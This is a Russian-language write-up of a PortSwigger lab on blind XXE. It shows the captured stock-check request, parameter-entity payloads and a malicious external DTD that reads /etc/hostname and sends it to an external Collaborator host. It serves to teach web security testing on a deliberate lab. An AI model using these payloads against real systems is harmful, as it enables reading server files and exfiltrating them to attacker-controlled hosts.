---
title: "Exploiting blind XXE to exfiltrate data using a malicious external DTD"
date: 2025-12-25
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration"
classes: wide
---	

В этой лабораторной работе есть функция `Check stock`, которая обрабатывает `XML`-ввод, но не отображает результат. Чтобы решить лабораторную, необходимо получить содержимое файла `/etc/hostname`.

```
https://0aaa000404bbddaf80191cb7007f00b5.web-security-academy.net/
```

# Solution

Необходимо найти место для встраивания `DTD` сущностей в `XML`. Соберу `http`-запрос ручки `Check stock`:

```http
POST /product/stock HTTP/2
Host: 0aaa000404bbddaf80191cb7007f00b5.web-security-academy.net
Cookie: session=z5D83JyEX9RpB8v5aM2ot8Gt4wY42NMH
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa000404bbddaf80191cb7007f00b5.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0aaa000404bbddaf80191cb7007f00b5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Отлично. Теперь нужно подобрать правильный пейлоад. Начну с самого простого варианта:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://exploit-0a2d006e044add3180891bc701310091.exploit-server.net/exploit"> ]>
	<stockCheck>
		<productId>1</productId>
		<storeId>&xxe;</storeId>
	</stockCheck>
```

Нам дан `exploit` сервер. Его я и буду использовать для получения отстука.

Получил следующую ошибку:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 47

"Entities are not allowed for security reasons"
```

Ладно. Буду пробовать дальше. Изменю свой пейлоад:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "https://exploit-0a2d006e044add3180891bc701310091.exploit-server.net/exploit"> %xxe; ]>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

А вот и отстук:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-exfiltration/1.png){: height="200" .align-center}

Теперь нужно на `exploit` сервер разместить `DTD` сущность, которая включит в себя содержимое `/etc/hostname` файла, а затем отправит `http`-запросом на сервер. Разобью на шаги:

- Создам сущность из файла:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
```

- Получу `URL` в `Burp Collaborator`:

```
9jtx9441icyck5axq2c29etl7cd31upj.oastify.com
```

- Добавлю параметрическую сущность, которая будет подставлять `file` в параметры `GET`-запроса в сущности `send`:

```xml
<!ENTITY % cmd "<!ENTITY &#x25; send SYSTEM 'https://9jtx9441icyck5axq2c29etl7cd31upj.oastify.com/?x=%file;'>">
```

- Соберу все вместе:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY &#x25; cmd SYSTEM 'https://9jtx9441icyck5axq2c29etl7cd31upj.oastify.com?x=%file;'>">
%send;
%cmd;
```

> `&#x25;` используется для объявления параметрической сущности внутри строки. По факту это символ `%`.

- Отправлю запрос и буду ждать чудо)


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-exfiltration/2.png){: height="200" .align-center}


Опа. А вот и `hostname`:`b45b6d4b2949`. Попробую сдать его на сайте.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-exfiltration/3.png){: height="200" .align-center}